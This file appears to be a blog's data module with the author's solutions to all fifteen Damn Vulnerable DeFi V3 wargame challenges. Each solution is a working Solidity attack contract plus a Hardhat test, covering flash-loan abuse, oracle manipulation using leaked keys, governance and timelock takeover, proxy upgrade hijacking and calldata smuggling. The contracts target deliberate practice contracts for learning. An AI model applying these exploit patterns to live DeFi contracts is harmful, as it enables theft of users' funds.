export default {
    posts: [
        {
            id: "damn-vulnerable-defi-solutions-1-unstoppable",
            title: `Damn Vulnerable DeFi V3 Solutions: Unstoppable`,
            description: `My solution to the 1st Damn Vulnerable DeFi v3 challenge.`,
            date: "May 30, 2023",
            tags: ["ETH", "Security"],
            snippets: [
                `if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();`,
                `it("Exploit", async function () {
    await token.connect(player).transfer(vault.address, 1);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-2-naive-receiver",
            title: `Damn Vulnerable DeFi V3 Solutions: Naive Receiver`,
            description: `My solution to the 2nd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 1, 2023",
            tags: ["ETH", "Security", "FlashLoans"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

interface INaiveReceiverLenderPool {
    function flashLoan(
        IERC3156FlashBorrower receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_NaiveReceiver {
    address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    function exploit(
        INaiveReceiverLenderPool pool,
        IERC3156FlashBorrower receiver
    ) public {
        for (uint256 i = 0; i < 10; i++) {
            pool.flashLoan(receiver, ETH, 1 ether, "x0");
        }
    }
}`,
                `it("Exploit", async function () {
    const attacker = await (
        await ethers.getContractFactory("Exploit_NaiveReceiver", player)
    ).deploy();

    attacker.exploit(pool.address, receiver.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-3-truster",
            title: `Damn Vulnerable DeFi V3 Solutions: Truster`,
            description: `My solution to the 3rd Damn Vulnerable DeFi v3 challenge.`,
            date: "June 2, 2023",
            tags: ["Security", "Exploit"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITrusterLenderPool {
    function flashLoan(
        uint256 amount,
        address borrower,
        address target,
        bytes calldata data
    ) external returns (bool);
}

contract Exploit_Truster {
    function exploit(
        IERC20 token,
        ITrusterLenderPool pool,
        address receiver
    ) external {
        bytes memory payload = abi.encodeWithSignature(
            "approve(address,uint256)",
            address(this),
            type(uint256).max
        );

        pool.flashLoan(0, receiver, address(token), payload);

        token.transferFrom(address(pool), receiver, 1_000_000 ether);
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_Truster", player)
    ).deploy();

    await attacker.exploit(token.address, pool.address, player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-4-side-entrance",
            title: `Damn Vulnerable DeFi V3 Solutions: Side Entrance`,
            description: `My solution to the 4th Damn Vulnerable DeFi v3 challenge.`,
            date: "June 3, 2023",
            tags: ["Security", "Flash Loan"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface ISideEntranceLenderPool {
    function deposit() external payable;
    function withdraw() external;
    function flashLoan(uint256 amount) external;
}

contract Exploit_SideEntrance {
    ISideEntranceLenderPool public pool;

    constructor(ISideEntranceLenderPool _pool) {
        pool = _pool;
    }

    function exploit(address payable receiver) external {
        // pool.flashLoan() will make a call to 'execute()' function where we exploit the contract
        pool.flashLoan(1000 ether);
        // Withdraw the credited balance to this contract
        pool.withdraw();
        // ransfer the stolen funds to attacker's EOA
        receiver.transfer(address(this).balance);
    }

    // Called by SideEntranceLenderPool::flashLoan
    function execute() public payable {
        // Return the flash loan using 'deposit()' function in the pool contract.
        // Using 'deposit()' will credit this contract with the amount of
        // returned flash loan had been taken.
        pool.deposit{value: address(this).balance}();
    }

    // This is necessary for this contract to be able to receive ETH
    receive() external payable {}
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_SideEntrance", player)
    ).deploy(pool.address);

    await attacker.exploit(player.address);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-5-the-rewarder",
            title: `Damn Vulnerable DeFi V3 Solutions: The Rewarder`,
            description: `My solution to the 5th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 5, 2023",
            tags: ["Security", "Flash Loan", "ERC20 Snapshot"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

interface ITheRewarderPool {
    function deposit(uint256 amount) external;
    function withdraw(uint256 amount) external;
}

interface IFlashLoanerPool {
    function flashLoan(uint256 amount) external;
}

contract Exploit_TheRewarder {
    address attackerEOA;
    IERC20 liquidityToken;
    IERC20 rewardToken;
    ITheRewarderPool rewardPool;
    IFlashLoanerPool flashLoanPool;

    constructor(
        address _attackerEOA,
        IERC20 _liquidityToken,
        IERC20 _rewardToken,
        ITheRewarderPool _rewardPool,
        IFlashLoanerPool _flashLoanPool
    ) {
        attackerEOA = _attackerEOA;
        liquidityToken = _liquidityToken;
        rewardToken = _rewardToken;
        rewardPool = _rewardPool;
        flashLoanPool = _flashLoanPool;
    }

    function exploit() public {
        uint256 amount = liquidityToken.balanceOf(address(flashLoanPool));
        flashLoanPool.flashLoan(amount);
    }

    //callback IFlashLoanerPool:flashLoan()
    function receiveFlashLoan(uint256 amount) public {
        liquidityToken.approve(address(rewardPool), amount);

        rewardPool.deposit(amount);
        rewardPool.withdraw(amount);

        uint256 stolenReward = rewardToken.balanceOf(address(this));
        require(stolenReward > 0, "Could not steal the funds.");
        rewardToken.transfer(attackerEOA, stolenReward);
        //return the flash loan
        liquidityToken.transfer(address(flashLoanPool), amount);
    }
}`,
                `it("Exploit", async function () {
    await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days

    attacker = await (
        await ethers.getContractFactory("Exploit_TheRewarder", player)
    ).deploy(
        player.address,
        liquidityToken.address,
        rewardToken.address,
        rewarderPool.address,
        flashLoanPool.address
    );

    await attacker.exploit();
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-6-selfie",
            title: `Damn Vulnerable DeFi V3 Solutions: Selfie`,
            description: `My solution to the 6th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 6, 2023",
            tags: ["Security", "Governance", "Flash Loan"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
import "../DamnValuableTokenSnapshot.sol";
import "./SimpleGovernance.sol";
import "./SelfiePool.sol";

contract Exploit_Selfie is IERC3156FlashBorrower {
    address attackerEOA;
    DamnValuableTokenSnapshot token;
    SelfiePool pool;
    SimpleGovernance governance;

    constructor(
        DamnValuableTokenSnapshot _token,
        SelfiePool _pool,
        SimpleGovernance _governance
    ) {
        attackerEOA = msg.sender;
        token = _token;
        pool = _pool;
        governance = _governance;
    }

    function exploit() external {
        uint256 poolBalance = token.balanceOf(address(pool));
        pool.flashLoan(this, address(token), poolBalance, "x0");
    }

    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes memory
    ) external returns (bytes32) {
        //take a snapshot because it is checked in '_hasEnoughVotes(address)'
        token.snapshot();
        //contruct a malicious tx payload
        bytes memory payload = abi.encodeWithSignature("emergencyExit(address)",attackerEOA);
        governance.queueAction(address(pool), 0, payload);
        //approve flash loan pool so it can pull back up the amount
        token.approve(address(pool), amount);
        //return CALLBACK_SUCCESS
        return keccak256("ERC3156FlashBorrower.onFlashLoan");
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_Selfie", player)
    ).deploy(token.address, pool.address, governance.address);

    await attacker.exploit();

    await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]); // 2 days

    await governance.executeAction(1); //the proposal ID is 1
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-7-compromised",
            title: `Damn Vulnerable DeFi V3 Solutions: Compromised`,
            description: `My solution to the 7th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 7, 2023",
            tags: ["Security", "DeFi", "Oracle"],
            snippets: [
                `//HTTP/2 200 OK
//content-type: text/html
//content-language: en
//vary: Accept-Encoding
//server: cloudflare

//4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35
//4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34`,
                `it("Exploit", async function () {
    const signer1 = new ethers.Wallet(
        "0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9",
        ethers.provider
    );
    const signer2 = new ethers.Wallet(
        "0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48",
        ethers.provider
    );

    await oracle.connect(signer1).postPrice("DVNFT", 0);
    await oracle.connect(signer2).postPrice("DVNFT", 0);

    await exchange.connect(player).buyOne({value: ethers.utils.parseEther("0.01")});

    await oracle.connect(signer1).postPrice("DVNFT", ethers.utils.parseEther("999"));
    await oracle.connect(signer2).postPrice("DVNFT", ethers.utils.parseEther("999"));

    await nftToken.connect(player).approve(exchange.address, 0);
    await exchange.connect(player).sellOne(0);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-8-puppet",
            title: `Damn Vulnerable DeFi V3 Solutions: Puppet`,
            description: `My solution to the 8th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 8, 2023",
            tags: ["Security", "DeFi", "Liquidity Pool"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./RequiredInterfaces.sol";

contract Exploit_Puppet {
    constructor(
        IERC20Permit token,
        IUniswapExchange exchange,
        ILendingPool lendingPool,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) payable {
        uint256 DVTAmount = token.balanceOf(msg.sender);
        // Use the signature to approve on behalf of attackerEOA
        token.permit(
            msg.sender,
            address(this),
            type(uint256).max,
            type(uint256).max,
            v,
            r,
            s
        );
        // now we can transfer the tokens from attackerEOA to this contract
        token.transferFrom(msg.sender, address(this), DVTAmount);
        // Swap the entire token balance for ETH.
        // Since the pool has little liquidity there will be a massive inbalance in price after this swap
        token.approve(address(exchange), DVTAmount);
        exchange.tokenToEthSwapInput(DVTAmount, 1, block.timestamp + 1000);
        // Required collateral is now very low (19,67 ETH) compared to needed amount before the swap.
        lendingPool.borrow{value: address(this).balance}(
            token.balanceOf(address(lendingPool)),
            msg.sender //attackerEOA
        );
    }
}
`,
                `it("Exploit", async function () {
    // Compute the address that we want to permit (attacker contract)
    const attackerAddress = ethers.utils.getContractAddress({
        from: player.address,
        nonce: 0,
    });
    // Sign the permit and return v, r, s value. Whe will pass these value to attacker contract contructor
    // and the attacker contract will use them to approve on behalf of attackerEOA
    const { r, s, v } = await signERC2612Permit(
        player,
        token.address,
        player.address,
        attackerAddress,
        ethers.constants.MaxUint256
    );
    // Deploy the attack contract with the given parameters and initilize it wiht 20 ETH
    attacker = await (
        await ethers.getContractFactory("Exploit_Puppet", player)
    ).deploy(
        token.address,
        uniswapExchange.address,
        lendingPool.address,
        v,
        r,
        s,
        { value: ethers.utils.parseEther("20") }
    );
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-9-puppet-v2",
            title: `Damn Vulnerable DeFi V3 Solutions: Puppet V2`,
            description: `My solution to the 9th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 9, 2023",
            tags: ["Security", "DeFi", "Liquidity Pool"],
            snippets: [
                `it("Exploit", async function () {
    await token
        .connect(player)
        .approve(uniswapRouter.address, PLAYER_INITIAL_TOKEN_BALANCE);
    // Swap all our DVT tokens for ETH. This action will dump the spot price.
    await uniswapRouter
        .connect(player)
        .swapExactTokensForETH(
            PLAYER_INITIAL_TOKEN_BALANCE,
            1,
            [token.address, weth.address],
            player.address,
            Date.now()
        );
    // exchange ETH for WETH using deposit function in weth contract
    // we must hold WETH because lender contract only accepts WETH as colletral
    await weth.connect(player).deposit({
        value: ethers.utils.parseEther("29.5"),
    });
    // approve the lender contract so it can pull WETH tokens from attacker's address
    await weth
        .connect(player)
        .approve(lendingPool.address, ethers.utils.parseEther("29.5"));
    // finally borrow 1 million DVT tokens supplying extremely low colletral compared
    // to the amount of colletral needed before we manipulated the liquidity pool
    await lendingPool.connect(player).borrow(POOL_INITIAL_TOKEN_BALANCE);
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-10-free-rider",
            title: `Damn Vulnerable DeFi V3 Solutions: Free Rider`,
            description: `My solution to the 10th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 10, 2023",
            tags: ["Security", "DeFi", "Flash Swap"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Callee.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "@openzeppelin/contracts/token/ERC721/IERC721Receiver.sol";

interface IMarketplace {
    function buyMany(uint256[] calldata tokenIds) external payable;
}

interface IUniswapV2Pair {
    function swap(
        uint amount0Out,
        uint amount1Out,
        address to,
        bytes calldata data
    ) external;
}

interface IWETH is IERC20 {
    function deposit() external payable;
    function withdraw(uint amount) external;
}

contract Exploit_FreeRider is IUniswapV2Callee, IERC721Receiver {
    uint256[] tokenIds = [0, 1, 2, 3, 4, 5];
    address immutable bountyContract;
    address immutable attackerEOA;
    IUniswapV2Pair immutable pair;
    IMarketplace immutable marketplace;
    IERC721 immutable nft;
    IWETH immutable weth;

    constructor(
        IUniswapV2Pair _pair,
        IMarketplace _marketplace,
        IERC721 _nft,
        IWETH _weth,
        address _bountyContract
    ) payable {
        bountyContract = _bountyContract;
        attackerEOA = msg.sender;
        pair = _pair;
        marketplace = _marketplace;
        nft = _nft;
        weth = _weth;
    }

    function exploit() public {
        bytes memory data = abi.encode(attackerEOA);
        pair.swap(15 ether, 0, address(this), data); //borrow WETH
    }

    // This function is called by the pair contract
    function uniswapV2Call(
        address,
        uint amount0,
        uint,
        bytes calldata data
    ) public {
        //convert all the borrowed WETH to ETH
        weth.withdraw(weth.balanceOf(address(this)));
        //buy all the NFTs in the market place
        marketplace.buyMany{value: 15 ether}(tokenIds);
        //transfer all the NFT to the recovery contract
        for (uint256 i = 0; i < tokenIds.length; i++) {
            nft.safeTransferFrom(address(this), bountyContract, tokenIds[i], data);
        }
        //calucate repay amount
        uint fee = ((amount0 * 3) / 997) + 1;
        uint amountToRepay = amount0 + fee;
        weth.deposit{value: amountToRepay}(); //convert ETH to WETH
        weth.transfer(address(pair), amountToRepay); //repay the borrowed amount
    }

    function onERC721Received(
        address,
        address,
        uint256,
        bytes memory
    ) external pure override returns (bytes4) {
        return IERC721Receiver.onERC721Received.selector;
    }

    receive() external payable {}
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_FreeRider", player)
    ).deploy(
        uniswapPair.address,
        marketplace.address,
        nft.address,
        weth.address,
        devsContract.address,
        { value: ethers.utils.parseEther("0.05") }
    );
    await attacker.exploit();
});
`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-11-backdoor",
            title: `Damn Vulnerable DeFi V3 Solutions: Backdoor`,
            description: `My solution to the 11th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 11, 2023",
            tags: ["Security", "Gnosis Safe", "Delegate Call"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./WalletRegistry.sol";
import "@gnosis.pm/safe-contracts/contracts/proxies/GnosisSafeProxyFactory.sol";

contract ApproveContract {
    function approve(address attacker, IERC20 token) public {
        token.approve(attacker, type(uint256).max);
    }
}

contract Exploit_Backdoor {
    WalletRegistry immutable walletRegistry;
    GnosisSafeProxyFactory immutable factory;
    GnosisSafe immutable masterCopy;
    IERC20 immutable token;
    ApproveContract immutable approveCode;
    address immutable attackerEOA;

    address[] public users;

    constructor(WalletRegistry _walletRegistiry, address[] memory _users) {
        walletRegistry = _walletRegistiry;
        factory = GnosisSafeProxyFactory(walletRegistry.walletFactory());
        masterCopy = GnosisSafe(payable(walletRegistry.masterCopy()));
        token = walletRegistry.token();
        approveCode = new ApproveContract();
        attackerEOA = msg.sender;
        users = _users;

        exploit();
    }

    function exploit() public {
        address wallet;
        bytes memory setupData;
        address[] memory owner = new address[](1);

        for (uint256 i = 0; i < 4; i++) {
            owner[0] = users[i];
            //setup gnosis safe wallet
            setupData = abi.encodeWithSelector(
                GnosisSafe.setup.selector,
                owner,
                1,
                address(approveCode),
                //here is the call we inserted that will be made during wallet creation
                //it will grant this contract unlimited token approvals
                abi.encodeWithSelector(
                    approveCode.approve.selector,
                    address(this),
                    token
                ),
                address(0),
                address(token),
                0,
                payable(attackerEOA)
            );

            //create the wallet behalf of the users
            wallet = address(
                factory.createProxyWithCallback(
                    address(masterCopy),
                    setupData,
                    0,
                    walletRegistry
                )
            );

            token.transferFrom(wallet, attackerEOA, token.balanceOf(wallet));
        }
    }
}`,
                `it('Exploit', async function () {
    //exploit() function in the attacker contract will be called during deployment
    attacker = await (await ethers.getContractFactory('Exploit_Backdoor', player)).deploy(
        walletRegistry.address,
        users
    );
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-12-climber",
            title: `Damn Vulnerable DeFi V3 Solutions: Climber`,
            description: `My solution to the 12th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 12, 2023",
            tags: ["Security", "UUPS Proxy"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./ClimberVault.sol";

contract ClimberVaultV2 is ClimberVault {
    function sweep(IERC20 token, address attackerEOA) public {
        token.transfer(attackerEOA, token.balanceOf(address(this)));
    }
}

contract Exploit_Climber {
    ClimberVault vault;
    ClimberTimelock timelock;
    IERC20 token;

    address[] targets;
    uint256[] values;
    bytes[] dataElements;

    constructor(ClimberVault _vault, IERC20 _token) {
        vault = _vault;
        timelock = ClimberTimelock(payable(vault.owner()));
        token = _token;
    }

    function exploit() public payable {
        targets = [
            address(timelock),
            address(timelock),
            address(vault),
            address(this)
        ];
        values = [0, 0, 0, 0];
        dataElements = [
            //set the delay to 0 to not get blocked by it.
            abi.encodeWithSelector(timelock.updateDelay.selector, 0),
            //grant this contract 'PROPOSER' role so it can schedule actions.
            abi.encodeWithSelector(
                timelock.grantRole.selector,
                PROPOSER_ROLE,
                address(this)
            ),
            //upgrade the contract with ClimberVaultV2 contract we created.
            abi.encodeWithSelector(
                vault.upgradeToAndCall.selector,
                address(new ClimberVaultV2()), //new implementation address
                // call that will be made after updating the implementation contract
                // the call will transfer all the tokens to attackerEOA
                abi.encodeWithSelector(
                    //malicious function that we insterted into the new logic contract
                    ClimberVaultV2.sweep.selector,
                    address(token),
                    msg.sender //attacker's EOA
                )
            ),
            //lastly call the function in this contract that schedules
            //all the these calls.
            abi.encodeWithSignature("scheduleOperation()")
        ];
        //execute the actions above
        timelock.execute(targets, values, dataElements, 0);
    }

    function scheduleOperation() public payable {
        //here the first three calls is made. Lastly we need to
        //schedule these calls so execute function does not revert.
        //we can make this call because we granted 'PROPOSER' role 
        //to this contract prior to this.
        timelock.schedule(targets, values, dataElements, 0);
    }
}`,
                `it('Exploit', async function () {
    attacker = await (await ethers.getContractFactory('Exploit_Climber', player)).deploy(
        vault.address,
        token.address
    );
    await attacker.connect(player).exploit();
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-13-wallet-mining",
            title: `Damn Vulnerable DeFi V3 Solutions: Wallet Mining`,
            description: `My solution to the 13th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 13, 2023",
            tags: ["Security", "Replay Attack"],
            snippets: [
                `//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function transfer(address to, uint256 amount) external returns (bool);
}

contract BadWallet {
    function exploit(address token, address attackerEOA) public {
        IERC20(token).transfer(attackerEOA, 20_000_000 ether);
    }
}`,
                `
//SPDX-License-Identifier:MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts-upgradeable/proxy/utils/UUPSUpgradeable.sol";

contract BadAuth is UUPSUpgradeable {
    function exploit() public {
        address payable addr = payable(
            address(0x76E2cFc1F5Fa8F6a5b3fC4c8F4788F0116861F9B)
        );
        selfdestruct(addr);
    }

    function _authorizeUpgrade(address imp) internal override {}
}`,
                `
it("Exploit", async function () {
    ///////////////////////////////////////////////////////////////////////////////////////////////
    //fund the factory deployer (this is the original GnosisSafeProxyFactory deployer from mainnet)
    await player.sendTransaction({
        from: player.address,
        to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A",
        value: ethers.utils.parseEther("1"),
    });
    //replay the transactions made by the deployer on mainnet
    await (await ethers.provider.sendTransaction(Copy)).wait();
    await (await ethers.provider.sendTransaction(Upgrade)).wait();
    //deploy the factory
    factory = await (await ethers.provider.sendTransaction(Factory)).wait();
    DeployedFactory = (
        await ethers.getContractFactory("GnosisSafeProxyFactory")
    ).attach(factory.contractAddress);
    //deploy the malicious wallet we created
    badWallet = await (await ethers.getContractFactory("BadWallet")).deploy();
    //encode the function to transferring the tokens from the wallet to attackerEOA
    const payload = new ethers.utils.Interface([
        "function exploit(address token, address attackerEOA)",
    ]).encodeFunctionData("exploit", [token.address, player.address]);
    //create the wallet and send the transaction at nonce 44
    for (let i = 1; i < 45; i++) {
        if (i == 43)
            depositWallet = await DeployedFactory.createProxy(badWallet.address, payload);
        await DeployedFactory.createProxy(badWallet.address, []); //increment nonce
    }
    //at this point we have drained 20 million tokens from the wallet
    ///////////////////////////////////////////////////////////////////////////////////////////////
    //Take over auth contract and upgrade it
    const authorizerUpgradeable = await (await ethers.getContractFactory("AuthorizerUpgradeable")).attach(
        "0xe7f1725e7734ce288f8367e1bb143e90bb3f0512"
    );
    await authorizerUpgradeable.connect(player).init([player.address], [token.address]);
    //upgrade the auth contract
    const badAuth = await (await ethers.getContractFactory("BadAuth")).deploy();
    let data = new ethers.utils.Interface(["function exploit()"]).encodeFunctionData("exploit", []);
    await authorizerUpgradeable.connect(player).upgradeToAndCall(badAuth.address, data);
    //drain 43 tokens left in the contract
    for (let i = 0; i < 43; i++) await walletDeployer.connect(player).drop([]);
    ///////////////////////////////////////////////////////////////////////////////////////////////
});
`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-14-puppet-v3",
            title: `Damn Vulnerable DeFi V3 Solutions: Puppet V3`,
            description: `My solution to the 14th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 14, 2023",
            tags: ["Security", "DeFi", "TWAP Oracle"],
            snippets: [
                `// SPDX-License-Identifier: MIT
pragma solidity >=0.7.6;
pragma abicoder v2;

import "./PuppetV3Pool.sol";
import "@uniswap/v3-periphery/contracts/interfaces/ISwapRouter.sol";

contract Exploit_PuppetV3 {
    PuppetV3Pool public lendingPool;
    IERC20Minimal immutable weth;
    IERC20Minimal immutable token;

    ISwapRouter constant router = ISwapRouter(0xE592427A0AEce92De3Edee1F18E0157C05861564);

    constructor(PuppetV3Pool _lendingPool) {
        lendingPool = _lendingPool;
        weth = lendingPool.weth();
        token = lendingPool.token();
    }

    function exploit() public {
        weth.approve(address(lendingPool), weth.balanceOf(address(this)));
        lendingPool.borrow(token.balanceOf(address(lendingPool)));
        token.transfer(msg.sender, token.balanceOf(address(this)));
    }

    function sellTokens() public {
        sell(address(token), address(weth), token.balanceOf(address(this)));
    }

    function sell(address tokenIn, address tokenOut, uint amountIn) public {
        IERC20Minimal(tokenIn).approve(address(router), amountIn);
        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter
            .ExactInputSingleParams({
                tokenIn: tokenIn,
                tokenOut: tokenOut,
                fee: 3000,
                recipient: address(this),
                deadline: block.timestamp,
                amountIn: amountIn,
                amountOutMinimum: 0,
                sqrtPriceLimitX96: 0
            });
        router.exactInputSingle(params);
    }
}`,
                `it("Exploit", async function () {
    attacker = await (
        await ethers.getContractFactory("Exploit_PuppetV3", player)
    ).deploy(lendingPool.address);

    await token
        .connect(player)
        .transfer(attacker.address, PLAYER_INITIAL_TOKEN_BALANCE);

    await attacker.connect(player).sellTokens();

    await time.increase(110);

    await attacker.connect(player).exploit();
});`,
            ],
        },
        {
            id: "damn-vulnerable-defi-solutions-15-abi-smuggling",
            title: `Damn Vulnerable DeFi V3 Solutions: ABI Smuggling`,
            description: `My solution to the 15th Damn Vulnerable DeFi V3 challenge.`,
            date: "June 15, 2023",
            tags: ["Security", "EVM", "Calldata Encoding"],
            snippets: [
                `it("Exploit", async function () {
    // 0x', prefix
    // 1cff79cd', 'execute()' function selector
    // 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 - target parameter
    // 0000000000000000000000000000000000000000000000000000000000000080 - start offset of the data
    // 0000000000000000000000000000000000000000000000000000000000000000 - extra bytes
    // d9caed1200000000000000000000000000000000000000000000000000000000 -
    // 0000000000000000000000000000000000000000000000000000000000000044 -
    // 85fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12 -
    // fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f -
    // 64180aa300000000000000000000000000000000000000000000000000000000 -

    let calldata =
        "0x1cff79cd000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f051200000000000000000000000000000000000000000000000000000000000000800000000000000000000000000000000000000000000000000000000000000000d9caed1200000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004485fb709d0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa300000000000000000000000000000000000000000000000000000000";

    await player.sendTransaction({to: vault.address, data: calldata});
});`,
            ],
        },
    ],
};
